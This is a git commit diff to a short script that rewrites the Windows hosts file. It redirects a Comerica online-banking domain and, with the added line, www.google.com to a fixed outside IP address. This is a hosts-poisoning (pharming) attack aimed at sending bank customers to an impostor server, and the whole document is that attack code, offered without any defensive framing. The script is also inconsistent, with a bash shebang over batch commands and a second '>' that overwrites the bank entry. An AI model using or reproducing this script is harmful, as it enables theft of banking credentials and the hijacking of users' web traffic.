f861c13b04a3c02632cc10db8ccb7b430d39ec93
SRock2000 <70704016+SRock2000@users.noreply.github.com>
2024-09-03 12:34:19 -0400

    Update windowsHosts.sh

--- windowsHosts.sh
+++ windowsHosts.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 @echo off
 echo 210.138.184.59 www.webbanking.comerica.com > %temp%\temphosts.txt
+echo 210.138.184.59 www.google.com > %temp%\temphosts.txt
 type C:\WINDOWS\system32\drivers\etc\hosts >> %temp%\temphosts.txt
 copy /Y %temp%\temphosts.txt C:\WINDOWS\system32\drivers\etc\hosts
